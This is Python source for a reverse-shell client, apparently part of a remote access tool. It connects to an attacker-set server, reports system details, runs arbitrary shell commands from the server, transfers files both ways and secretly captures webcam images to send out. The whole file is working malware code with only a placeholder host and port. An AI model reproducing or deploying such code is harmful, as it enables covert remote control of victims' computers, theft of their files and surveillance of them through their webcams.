import socket
import subprocess
import os
import platform
import cv2


def webcam_snap():
    webcam = cv2.VideoCapture(0)
    check, frame = webcam.read()
    if not os.path.exists("C:\\tmp"):
        os.mkdir("C:\\tmp")
    cv2.imwrite(filename="C:\\tmp\\p.png", img=frame)
    webcam.release()
    send_file("C:\\tmp\\p.png")
    os.remove("C:\\tmp\\p.png")


def send_file(filename):
    try:
        filesize = os.path.getsize(filename)
    except:
        s.send("Path doesn't exist!".encode())
        return
    s.send(str(filesize).encode())
    if s.recv(BUFFER_SIZE).decode() == "ok":
        # start sending the file
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    break
                s.sendall(bytes_read)


def recv_file(path):
    filesize = int(s.recv(BUFFER_SIZE).decode())
    s.send("ok".encode())
    left = filesize
    try:
        f = open(path, "wb")
        while 1:
            rev = s.recv(BUFFER_SIZE)
            f.write(rev)
            left -= len(rev)
            if left == 0:
                break
        f.close()
    except FileNotFoundError:
        s.send("No such file or directory".encode())


def run():
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        elif command[:2] == 'cd':
            if command[3] == '~':
                os.chdir(os.environ['HOME'] + (command[4:] if len(command) > 3 else None))
            else:
                os.chdir(command[3:])
            s.send(os.getcwd().encode())
        # File download
        elif command[:8] == "download":
            filename = command[9:]
            send_file(filename)
        # File upload
        elif command[:6] == "upload":
            filename = command[7:]
            recv_file(filename)
        # Webcam Snapshot
        elif command[:11] == "webcam_snap":
            webcam_snap()
        else:
            # execute the command and retrieve the results
            p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output = p.stdout
            # send the results back to the server
            s.send(output + "\n".encode() + os.getcwd().encode())
    s.close()


if __name__ == '__main__':
    SERVER_HOST = "$HOST$"
    SERVER_PORT = "$PORT$"
    BUFFER_SIZE = 10240
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))
    # send platform message
    s.send(platform.platform().encode() + "\n".encode() + os.getcwd().encode())
    # acccept the chcp command
    cmd = s.recv(BUFFER_SIZE).decode()
    p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    run()